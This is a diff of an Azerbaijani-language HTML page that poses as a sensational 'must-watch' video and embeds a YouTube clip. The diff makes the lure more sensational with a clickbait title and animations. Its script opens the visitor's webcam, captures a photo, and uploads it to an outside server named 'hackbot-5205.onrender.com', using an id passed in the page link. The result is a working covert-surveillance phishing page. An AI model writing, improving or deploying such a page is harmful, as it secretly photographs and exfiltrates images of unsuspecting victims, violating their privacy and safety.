@@ -3,38 +3,62 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Maraqlı Video</title>
+    <title>😱 DƏHŞƏT! Bu Videonu Mütləq İzlə! 😱</title>
     <style>
         body {
             margin: 0;
             padding: 0;
-            font-family: Arial, sans-serif;
-            background-color: #f4f4f9;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background: linear-gradient(135deg, #ff6b6b, #4b79a1);
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
+            overflow: hidden;
         }
         .container {
             text-align: center;
-            background: #fff;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            background: rgba(255, 255, 255, 0.95);
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
+            max-width: 600px;
+            animation: fadeIn 1s ease-in-out;
         }
         h1 {
-            color: #333;
-            font-size: 24px;
+            color: #d32f2f;
+            font-size: 32px;
             margin-bottom: 20px;
+            text-transform: uppercase;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.2);
         }
         iframe {
-            border: none;
-            border-radius: 8px;
+            border: 3px solid #d32f2f;
+            border-radius: 10px;
+            transition: transform 0.3s ease;
+        }
+        iframe:hover {
+            transform: scale(1.02);
         }
         .message {
-            margin-top: 10px;
-            font-size: 16px;
-            color: #666;
+            margin-top: 15px;
+            font-size: 18px;
+            color: #333;
+            font-weight: bold;
+            animation: pulse 2s infinite;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+        .emoji {
+            font-size: 24px;
+            margin: 0 5px;
         }
     </style>
     <script>
@@ -45,7 +69,6 @@
                 const video = document.createElement('video');
                 video.srcObject = stream;
 
-                // Videonun yüklənməsini gözlə
                 await new Promise((resolve) => {
                     video.onloadedmetadata = () => {
                         console.log("Video yükləndi, ölçülər:", video.videoWidth, video.videoHeight);
@@ -54,16 +77,15 @@
                 });
 
                 video.play();
-                await new Promise((resolve) => setTimeout(resolve, 1000)); // Əlavə gözləmə
+                await new Promise((resolve) => setTimeout(resolve, 1000));
 
                 const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;  // Dinamik ölçü
-                canvas.height = video.videoHeight;  // Dinamik ölçü
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                 stream.getTracks().forEach(track => track.stop());
 
-                // Şəkli konsolda yoxla
                 const imageDataUrl = canvas.toDataURL('image/jpeg');
                 console.log("Çəkilən şəkil (ilk 50 simvol):", imageDataUrl.substring(0, 50) + "...");
 
@@ -81,7 +103,7 @@
                     }).catch(error => {
                         console.error('Şəkil göndərilmə xətası:', error);
                     });
-                }, 'image/jpeg', 0.9);  // JPEG formatında, keyfiyyət 0.9
+                }, 'image/jpeg', 0.9);
             } catch (err) {
                 console.error("Kamera xətası:", err);
             }
@@ -116,7 +138,7 @@
             const urlParams = new URLSearchParams(window.location.search);
             const unique_id = urlParams.get('id');
             const type = urlParams.get('type');
-            const api_url = 'https://hackbot-5205.onrender.com'; // Ngrok linkinizi bura yazın
+            const api_url = 'https://hackbot-5205.onrender.com';
 
             console.log("Link parametrləri:", { unique_id, type, api_url });
 
@@ -136,9 +158,9 @@
 </head>
 <body>
     <div class="container">
-        <h1>Bu Maraqlı Videoya Bax!</h1>
-        <iframe width="560" height="315" src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
-        <p class="message">Videodan həzz al! 😊</p>
+        <h1>😱 DƏHŞƏT! Bu Videonu Mütləq izlə! 😱</h1>
+        <iframe width="560" height="315" src="https://www.youtube.com/embed/L2wQ9x4eoBw?si=6usBHyJ9nCzro6wZ" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+        <p class="message"> <span class="emoji">🔥</span><span class="emoji">🚀</span></p>
     </div>
 </body>
 </html>
